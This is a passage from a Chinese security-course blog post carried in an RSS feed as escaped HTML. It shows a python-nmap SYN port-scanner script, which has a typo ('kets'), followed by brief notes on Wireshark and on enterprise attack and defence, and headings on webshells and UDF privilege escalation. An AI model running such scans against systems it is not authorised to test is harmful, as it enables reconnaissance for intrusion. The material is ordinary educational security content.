http://dpm12345.cn/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;email        : 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 准备工作&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# Window nmap.exe&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# Linux&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# python-namp   pip install python-nmap&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 目标实现指定 IP 或 ip 范围的端口扫描&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; nmap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;input_data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Please input hosts and ports:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;scan_row &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; input_data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;scan_row&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;error&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hosts &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; scan_row&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ports &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; scan_row&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建一个扫描对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    nm &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; nmap&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PortScanner&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Nmap not found&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;scan&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hosts&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;hosts&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arguments&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; -v -sS -p&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; ports&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 遍历扫描的主机&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; nm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;all_hosts&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;-&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Host:{}{}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; nm&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hostname&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;State:{}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;nm&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;state&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出主机状态&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; proto &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; nm&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;all_protocols&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 遍历所有的协议&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;-&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;protocol:{}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;proto&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 扫描所有端口所对应的状态&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        lport &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; nm&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;proto&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;kets&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; port &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; lport&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;port:{}\tstate:{}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; nm&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;proto&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;state&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;315-流量分析实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#315-流量分析实战&#34;&gt;#&lt;/a&gt; 3.15 流量分析实战&lt;/h1&gt;
&lt;p&gt;wireshark 的基本介绍&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只能查看包，无法拦截修改&lt;/li&gt;
&lt;li&gt;filter 的规则&lt;/li&gt;
&lt;li&gt;功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;316-企业攻防实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#316-企业攻防实战&#34;&gt;#&lt;/a&gt; 3.16 企业攻防实战&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;攻防&lt;/p&gt;
&lt;p&gt;攻击 --&amp;gt; web 渗透 -- 主机 --&amp;gt; 内网渗透&lt;/p&gt;
&lt;p&gt;防护 --&amp;gt; web 安全防护 -- 系统安全防护 -- 安全设备防护等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如何做好一个白帽子：要具备黑帽子技术同时具备防护的技术&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如何做好防护：在攻击前打好漏洞补丁&lt;/p&gt;
&lt;p&gt;web 代码、系统漏洞、中间件的配置、数据库&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;框架熟知&lt;/p&gt;
&lt;h1 id=&#34;317-揭秘黑客如何通过木马控制目标服务器-webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#317-揭秘黑客如何通过木马控制目标服务器-webshell&#34;&gt;#&lt;/a&gt; 3.17 揭秘黑客如何通过木马控制目标服务器 - webshell&lt;/h1&gt;
&lt;p&gt;udf 提权&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
